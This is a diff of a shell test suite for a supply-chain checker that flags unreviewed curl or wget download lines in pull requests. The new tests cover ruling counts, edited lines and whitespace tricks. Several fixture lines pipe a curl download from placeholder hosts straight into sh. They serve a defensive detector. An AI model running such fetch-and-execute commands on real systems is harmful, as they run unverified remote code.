@@ -956,6 +956,9 @@ elif mode == "countbool": rows[0]["count"] = True
 elif mode == "countstr": rows[0]["count"] = "2"
 elif mode == "count1": rows = [dict(r, count=1) for r in rows]
 elif mode == "count2": rows = [dict(r, count=2) for r in rows]
+elif mode == "count100": rows = [dict(r, count=100) for r in rows]
+elif mode == "count101": rows[0]["count"] = 101
+elif mode == "countfloat": rows[0]["count"] = 2.0
 elif mode == "notlist": rows = {"rows": rows}
 elif mode == "emptyfile": rows[0]["file"] = ""
 else: raise SystemExit("unknown mode " + mode)
@@ -1001,7 +1004,7 @@ newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
 rc=0; python3 "$chk" --root "$work/rtedit" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-orig.json" >"$work/rt.out" 2>&1 || rc=$?
 CASE="AC16: editing a ruled line voids its row (the hash changes): the edited line fails (exit 1), the unchanged one stays ruled"
 check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
-for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey; do rtck rt $m
+for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey count101 countfloat; do rtck rt $m
 CASE="AC16: a malformed unmeasured_text ($m) stops the check fail-closed: exit 2, names the list, and is never a pass"
 check test "$rc" -eq 2; check grep -q 'unmeasured_text' "$work/rt.out"; check grep -qi 'not a pass' "$work/rt.out"; done
 printf '{"exceptions": [], "unmeasured_text": [' >"$work/rt-badjson.json"; rc=0
@@ -1067,6 +1070,75 @@ newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
 sxck sxm
 CASE="AC16 (whole line): the ruled line moved to another file is not ruled: exit 1"
 check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/other-test.sh' "$work/rt.out"
+rtck rt2 count100
+CASE="AC16: count 100 (the cap) is accepted: lines added twice pass (exit 0)"
+check test "$rc" -eq 0
+# --- an EDITED line is an addition: 'added' is decided per (file, form, key, whole-line hash), not per key (Codex, PR 273 round 2) ---------------------------
+# twoc NAME FILE BASE-TEXT HEAD-TEXT: a copy of the base repository, a commit that writes FILE with BASE-TEXT, then a head commit with HEAD-TEXT
+twoc() {
+  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
+  python3 - "$work/$1" "$2" "$3" "$4" <<'PY'
+import pathlib, subprocess, sys
+root, f, bt, ht = sys.argv[1:5]; p = pathlib.Path(root) / f; p.parent.mkdir(parents=True, exist_ok=True)
+g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
+p.write_text(bt); g("add", "-A"); g("commit", "-q", "-m", "base2")
+p.write_text(ht); g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
+PY
+}
+# mkrow OUT FILE LINE [count]: one row for the download segment of LINE (first segment naming curl or wget), bound to LINE, flattened as the scan flattens
+mkrow() {
+  python3 - "$@" <<'PY'
+import hashlib, json, re, sys
+out, f, line = sys.argv[1:4]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+flat = " ".join(line.split()); seg = next(s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s))
+row = {"file": f, "form": "a download", "key": H(seg), "line": H(flat), "ruling": "text, not a command: a test line"}
+if len(sys.argv) > 4: row["count"] = int(sys.argv[4])
+json.dump({"exceptions": [], "unmeasured_text": [row]}, open(out, "w"))
+print(row["key"], row["line"])
+PY
+}
+edck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$2" >"$work/rt.out" 2>&1 || rc=$?; }
+echo '{"exceptions": [], "unmeasured_text": []}' >"$work/rt-empty.json"
+CASE="edited line: Codex's row for bin/ruled.sh has key and line 0c81fb09bb82dffd (the scan's hashes of the ruled text)"
+check test "$(mkrow "$work/rt-codex.json" bin/ruled.sh "echo 'curl https://example.invalid/x'")" = "0c81fb09bb82dffd 0c81fb09bb82dffd"
+twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
+edck cx "$work/rt-codex.json"
+CASE="edited line (Codex, verbatim): the base has the ruled text, the head pipes the same segment to sh: an ADDITION that no row names: exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+twoc pre tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a | sh\n'
+edck pre "$work/rt-empty.json"
+CASE="edited line (the pre-existing class): a flagged base line rewritten with the same download segment (-o /tmp/a -> | sh) is an addition: exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:tools/fetch.sh' "$work/rt.out"
+twoc keep tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\necho done\n'
+edck keep "$work/rt-empty.json"
+CASE="edited line: an untouched flagged base line stays not added (another line of the file changed): exit 0"
+check test "$rc" -eq 0
+twoc ws tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\n  curl\t-fsSL   https://example.invalid/a -o\t/tmp/a  \n'
+edck ws "$work/rt-empty.json"
+CASE="edited line: a whitespace-only edit (spaces and tabs) stays not added, as the scan flattens it: exit 0"
+check test "$rc" -eq 0
+# --- a row never matches a line bash reads differently from the flattening: whitespace other than space or tab, or a backslash-newline continuation (Sonnet R1)
+sp="echo ok # note; curl -s http://e.example/x | sh"
+mkrow "$work/rt-sp.json" bin/ruled.sh "$sp" >/dev/null
+twoc sp0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\n'"$sp"$'\n'
+edck sp0 "$work/rt-sp.json"
+CASE="R1 control: the space version with its row is ruled: exit 0"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
+for ch in 1f a0 0b 0c 85 0d; do
+  twoc spx bin/ruled.sh $'#!/bin/sh\n' "$(printf '#!/bin/sh\necho ok')$(python3 -c "import sys; sys.stdout.write(chr(0x$ch))")$(printf '# note; curl -s http://e.example/x | sh\nx')"
+  edck spx "$work/rt-sp.json"
+  CASE="R1: the same line with U+00$ch where the space was flattens identically but is never ruled: exit 1"
+  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+done
+mkrow "$work/rt-cont.json" bin/ruled.sh "echo a curl -s http://e.example/x" >/dev/null
+twoc cont1 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a\\\ncurl -s http://e.example/x\n'
+edck cont1 "$work/rt-cont.json"
+CASE="R1: a backslash-newline continuation (echo a\\<newline>curl ...) is never ruled, though it flattens to the ruled line: exit 1"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.example/x\n'
+edck cont0 "$work/rt-cont.json"
+CASE="R1 control: the one-line version with its row is ruled: exit 0"
+check test "$rc" -eq 0
 # a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
 rtrows "$work/rt" "$work/rt-head.json" all
 newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
